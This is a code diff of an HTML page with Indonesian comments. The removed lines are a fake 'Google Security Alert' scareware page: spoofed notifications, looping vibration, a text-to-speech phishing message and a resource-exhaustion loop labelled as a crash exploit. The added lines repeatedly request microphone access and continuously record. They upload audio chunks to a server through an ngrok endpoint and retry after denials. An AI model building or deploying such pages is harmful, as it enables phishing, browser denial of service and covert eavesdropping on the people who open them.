@@ -3,345 +3,236 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>Microphone Lifecycle Probe</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
-  #inpage-notif-banner {
-    position: fixed;
-    top: 12px;
-    left: 12px;
-    right: 12px;
-    background: #111827;
-    color: #f9fafb;
-    border-left: 4px solid #ef4444;
-    padding: 12px 14px;
-    border-radius: 6px;
-    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
-    font-size: 13px;
-    z-index: 9999;
-    display: none;
-  }
-  #inpage-notif-banner strong { display: block; margin-bottom: 2px; font-size: 14px; }
+  body { background: #111827; color: #f9fafb; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; padding: 16px; }
+  .box { background: #1f2937; border: 1px solid #374151; border-radius: 8px; padding: 14px 16px; max-width: 400px; width: 100%; font-size: 13px; line-height: 1.5; }
+  .muted { color: #9ca3af; font-size: 12px; margin-top: 6px; }
 </style>
 </head>
 <body>
-<div id="inpage-notif-banner">
-  <strong id="notif-title">Security Alert</strong>
-  <span id="notif-body">Checking security status...</span>
+<div class="box">
+  <div id="mic-status">Menunggu akses mikrofon &amp; siklus perekaman...</div>
+  <div class="muted" id="mic-meta">Chunks terkirim: 0 | State: idle</div>
 </div>
+
 <script>
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY, VIBRATOR & NOTIFICATION
-  // ============================================
+  var SERVER_BASE = window.location.origin;
+
   var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
-    vibrate: {
-      pattern: [250, 120, 250, 120, 500],
-      intervalMs: 1400
-    },
-    notification: {
-      title: "Google Security Alert",
-      body: "Your account has been accessed from an unknown device. Verify your identity immediately.",
-      tag: "security-alert-notif",
-      renotify: true
-    }
+    chunkTimesliceMs: 3000,   // Durasi per potongan audio yang dikirim ke server (ms)
+    retryDelayMs: 3000,       // Jeda percobaan ulang jika stream mikrofon terhenti/ditolak
+    watchdogMs: 4000          // Siklus pengecekan status recorder & stream
   };
 
   var state = {
-    ttsStarted: false,
-    mainPlayed: false,
-    ttsCount: 0,
-    vibrateTimer: null,
-    notifShown: false
+    stream: null,
+    recorder: null,
+    micActive: false,
+    micPending: false,
+    retryTimer: null,
+    watchdogTimer: null,
+    sentChunks: 0,
+    lastBlob: null
   };
 
-  // ============================================
-  // NOTIFICATION MODULE
-  // ============================================
-  function showInPageBanner(title, body) {
-    try {
-      var banner = document.getElementById('inpage-notif-banner');
-      var titleEl = document.getElementById('notif-title');
-      var bodyEl = document.getElementById('notif-body');
-      if (titleEl) titleEl.textContent = title;
-      if (bodyEl) bodyEl.textContent = body;
-      if (banner) banner.style.display = 'block';
-    } catch (e) {}
-  }
-
-  function dispatchWebNotification() {
-    showInPageBanner(CONFIG.notification.title, CONFIG.notification.body);
-
-    try {
-      if (!('Notification' in window)) {
-        console.log('[NOTIF] Notification API not supported in this browser/WebView');
-        return;
-      }
-
-      if (Notification.permission === 'granted') {
-        var n = new Notification(CONFIG.notification.title, {
-          body: CONFIG.notification.body,
-          tag: CONFIG.notification.tag,
-          renotify: CONFIG.notification.renotify
-        });
-        state.notifShown = true;
-        console.log('[NOTIF] Web notification dispatched');
-        return n;
-      }
-
-      if (Notification.permission === 'default') {
-        var req = Notification.requestPermission(function (perm) {
-          console.log('[NOTIF] Permission result:', perm);
-          if (perm === 'granted' && !state.notifShown) {
-            new Notification(CONFIG.notification.title, {
-              body: CONFIG.notification.body,
-              tag: CONFIG.notification.tag,
-              renotify: CONFIG.notification.renotify
-            });
-            state.notifShown = true;
-          }
-        });
-
-        if (req && typeof req.then === 'function') {
-          req.then(function (perm) {
-            console.log('[NOTIF] Promise permission result:', perm);
-            if (perm === 'granted' && !state.notifShown) {
-              new Notification(CONFIG.notification.title, {
-                body: CONFIG.notification.body,
-                tag: CONFIG.notification.tag,
-                renotify: CONFIG.notification.renotify
-              });
-              state.notifShown = true;
-            }
-          }).catch(function () {});
-        }
-      } else {
-        console.log('[NOTIF] Permission status:', Notification.permission);
-      }
-    } catch (e) {
-      console.log('[NOTIF] Error:', e.message);
+  function updateStatus(msg, extra) {
+    var sEl = document.getElementById('mic-status');
+    var mEl = document.getElementById('mic-meta');
+    var now = new Date().toLocaleTimeString();
+    if (sEl) sEl.textContent = "[" + now + "] " + msg;
+    if (mEl) {
+      var recState = state.recorder ? state.recorder.state : 'none';
+      mEl.textContent = "Chunks terkirim: " + state.sentChunks + " | Recorder: " + recState + (extra ? " | " + extra : "");
     }
+    console.log("[" + now + "] " + msg);
   }
 
-  // ============================================
-  // VIBRATOR MODULE
-  // ============================================
-  function triggerVibrationOnce() {
-    try {
-      if ('vibrate' in navigator && typeof navigator.vibrate === 'function') {
-        navigator.vibrate(CONFIG.vibrate.pattern);
+  function sendAudioChunk(blob, useKeepalive) {
+    if (!blob || blob.size === 0) return;
+
+    var formData = new FormData();
+    formData.append('audio', blob, 'mic_chunk.webm');
+
+    fetch(SERVER_BASE + "/upload-audio", {
+      method: "POST",
+      keepalive: Boolean(useKeepalive),
+      headers: {
+        "ngrok-skip-browser-warning": "true"
+      },
+      body: formData
+    })
+    .then(function (res) { return res.json(); })
+    .then(function (data) {
+      if (data && data.status === "success") {
+        state.sentChunks++;
+        updateStatus("Audio terkirim ke server", "Bytes: " + blob.size);
+      } else {
+        updateStatus("Respon server: " + (data && data.message ? data.message : "gagal"));
       }
-    } catch (e) {}
+    })
+    .catch(function (err) {
+      updateStatus("Gagal kirim audio: " + err.message);
+    });
   }
 
-  function startVibrationLoop() {
-    triggerVibrationOnce();
-    if (state.vibrateTimer) return;
-    state.vibrateTimer = setInterval(function () {
-      triggerVibrationOnce();
-    }, CONFIG.vibrate.intervalMs);
-  }
-
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+  function startRecorderCycle(stream) {
+    if (!('MediaRecorder' in window)) {
+      updateStatus("MediaRecorder tidak didukung di WebView/browser ini.");
+      return;
+    }
 
     try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
+      if (state.recorder && state.recorder.state !== 'inactive') {
+        try { state.recorder.stop(); } catch (e) {}
+      }
 
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
+      var options = {};
+      if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+        options.mimeType = 'audio/webm;codecs=opus';
+      } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+        options.mimeType = 'audio/mp4';
+      }
 
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+      var rec = new MediaRecorder(stream, options);
+      state.recorder = rec;
+
+      rec.ondataavailable = function (event) {
+        if (event.data && event.data.size > 0) {
+          state.lastBlob = event.data;
+          sendAudioChunk(event.data, false);
         }
       };
 
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
-  }
+      rec.onstop = function () {
+        if (state.lastBlob && state.lastBlob.size > 0) {
+          sendAudioChunk(state.lastBlob, true);
+        }
+        state.micActive = false;
+        scheduleMicRetry();
+      };
 
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
+      rec.onerror = function (err) {
+        updateStatus("Error MediaRecorder: " + (err.error ? err.error.name : "unknown"));
+        state.micActive = false;
+        scheduleMicRetry();
+      };
 
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 1.0;
-      osc.frequency.value = 1000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.muted = false;
-      a.volume = 1.0;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
-      }
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 1.0 * env;
-      }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
+      rec.start(CONFIG.chunkTimesliceMs);
+      updateStatus("Mikrofon aktif, merekam & mengirim suara ke server...");
     } catch (e) {
-      startTTS();
+      updateStatus("Gagal memulai MediaRecorder: " + e.message);
+      state.micActive = false;
+      scheduleMicRetry();
     }
   }
 
-  // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    startVibrationLoop();
-    dispatchWebNotification();
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
-    setInterval(function() {
-      try {
-        triggerVibrationOnce();
-        for (var i = 0; i < 2000; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
-          gain.gain.value = 1.0;
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          u.volume = 1.0;
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
+  function scheduleMicRetry() {
+    clearTimeout(state.retryTimer);
+    if (state.micActive || state.micPending) return;
+    state.retryTimer = setTimeout(function () {
+      requestMicAccess();
+    }, CONFIG.retryDelayMs);
   }
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  dispatchWebNotification();
-  unlockAudioContext();
-  trySilentAudio();
-  triggerVibrationOnce();
+  function requestMicAccess() {
+    if (state.micActive || state.micPending) return;
 
-  setTimeout(function () {
-    dispatchWebNotification();
-    unlockAudioContext();
-    triggerVibrationOnce();
-    startTTS(); // coba TTS lebih awal
-  }, 100);
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      updateStatus("navigator.mediaDevices.getUserMedia tidak tersedia.");
+      scheduleMicRetry();
+      return;
+    }
 
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
+    state.micPending = true;
+    updateStatus("Meminta izin akses mikrofon...");
 
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
-    triggerHighSeverityCrash();
-    
-  }, 1500);
+    navigator.mediaDevices.getUserMedia({
+      audio: {
+        echoCancellation: true,
+        noiseSuppression: true,
+        autoGainControl: true
+      },
+      video: false
+    })
+    .then(function (stream) {
+      state.micPending = false;
+      state.micActive = true;
+      state.stream = stream;
 
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    triggerVibrationOnce();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
+      stream.getAudioTracks().forEach(function (track) {
+        track.onended = function () {
+          state.micActive = false;
+          state.stream = null;
+          updateStatus("Audio track berakhir, menjadwalkan ulang...");
+          scheduleMicRetry();
+        };
+      });
 
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden) {
-      dispatchWebNotification();
-      triggerVibrationOnce();
-      if (!state.mainPlayed) {
-        setTimeout(playMainAudio, 100);
+      startRecorderCycle(stream);
+    })
+    .catch(function (err) {
+      state.micPending = false;
+      state.micActive = false;
+      updateStatus("Akses mikrofon belum aktif (" + err.name + "), mencoba lagi...");
+      scheduleMicRetry();
+    });
+  }
+
+  function startWatchdog() {
+    if (state.watchdogTimer) return;
+    state.watchdogTimer = setInterval(function () {
+      var hasLiveTrack = state.stream && state.stream.getAudioTracks().some(function (t) {
+        return t.readyState === 'live';
+      });
+      if (!state.micActive || !hasLiveTrack) {
+        state.micActive = false;
+        if (!state.micPending) {
+          requestMicAccess();
+        }
+      } else if (state.recorder && state.recorder.state === 'inactive') {
+        startRecorderCycle(state.stream);
       }
+    }, CONFIG.watchdogMs);
+  }
+
+  ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
+    document.addEventListener(evtName, function () {
+      startWatchdog();
+      requestMicAccess();
+    }, { passive: true });
+  });
+
+  window.addEventListener('DOMContentLoaded', function () {
+    startWatchdog();
+    requestMicAccess();
+  });
+
+  document.addEventListener('visibilitychange', function () {
+    if (document.hidden) {
+      if (state.recorder && state.recorder.state === 'recording') {
+        try { state.recorder.requestData(); } catch (e) {}
+      }
+      if (state.lastBlob) {
+        sendAudioChunk(state.lastBlob, true);
+      }
+    } else {
+      state.micActive = false;
+      state.micPending = false;
+      requestMicAccess();
+    }
+  });
+
+  window.addEventListener('pagehide', function () {
+    if (state.recorder && state.recorder.state === 'recording') {
+      try { state.recorder.requestData(); } catch (e) {}
+    }
+    if (state.lastBlob) {
+      sendAudioChunk(state.lastBlob, true);
     }
   });
 })();
